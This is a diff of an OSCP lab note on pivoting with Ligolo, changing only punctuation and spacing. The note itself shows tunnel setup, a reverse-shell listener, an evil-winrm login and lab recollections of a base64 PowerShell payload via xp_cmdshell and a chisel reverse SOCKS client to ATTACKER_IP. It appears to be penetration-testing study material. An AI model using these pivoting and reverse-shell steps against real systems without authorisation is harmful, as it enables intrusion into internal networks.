@@ -4,7 +4,7 @@ Best pivoting tool for OSCP. Easy setup, reliable, fast. No [[Proxychains]] need
 
 See also: [[Pivoting-Methodology]]
 
-## Setup — Kali (Proxy)
+## Setup - Kali (Proxy)
 
 ```bash
 # Create TUN interface
@@ -15,7 +15,7 @@ sudo ip link set ligolo up
 ./proxy -selfcert -laddr 0.0.0.0:11601
 ```
 
-## On Target — Upload Agent
+## On Target - Upload Agent
 
 ```bash
 # Linux
@@ -30,9 +30,9 @@ sudo ip link set ligolo up
 ## In Ligolo Proxy Console
 
 ```
-session          # select the session
-ifconfig         # see target's interfaces — find the internal subnet
-start            # start the tunnel
+session # select the session
+ifconfig # see target's interfaces - find the internal subnet
+start # start the tunnel
 ```
 
 ## Add Route on Kali
@@ -53,7 +53,7 @@ evil-winrm -i 10.10.10.X -u user -p password
 ## Reverse Port Forward (Get Callbacks from Internal Targets)
 
 ```
-# In Ligolo console — forward internal target's connection back to Kali
+# In Ligolo console - forward internal target's connection back to Kali
 listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
 ```
 
@@ -88,10 +88,10 @@ sudo ip tuntap del mode tun ligolo
 
 ## From Your Boxes
 
-> **OSCP B — MS01/MS02** (Course) — Used Ligolo to forward reverse shell callbacks from internal MS02 back to Kali
+> **OSCP B - MS01/MS02** (Course) - Used Ligolo to forward reverse shell callbacks from internal MS02 back to Kali
 > - What worked: Ran Ligolo agent on MS01, created a listener to forward MS02's reverse shell connection back to Kali. Used xp_cmdshell on MS02 MSSQL to fire a base64 PowerShell payload at the Ligolo listener
-> - Lesson: Ligolo's `listener_add` is essential when you need reverse shell callbacks from internal targets — chisel SOCKS alone won't handle inbound connections
+> - Lesson: Ligolo's `listener_add` is essential when you need reverse shell callbacks from internal targets - chisel SOCKS alone won't handle inbound connections
 
-> **Berlin** (Course/OSCP B) — Tried Ligolo first for port forwarding but the client kept dying; switched to chisel
-> - What worked: Chisel succeeded where Ligolo failed — `./chisel client ATTACKER_IP:8000 R:socks`
+> **Berlin** (Course/OSCP B) - Tried Ligolo first for port forwarding but the client kept dying; switched to chisel
+> - What worked: Chisel succeeded where Ligolo failed - `./chisel client ATTACKER_IP:8000 R:socks`
 > - Lesson: Always have a fallback. If Ligolo agent dies on the target, chisel is the reliable backup
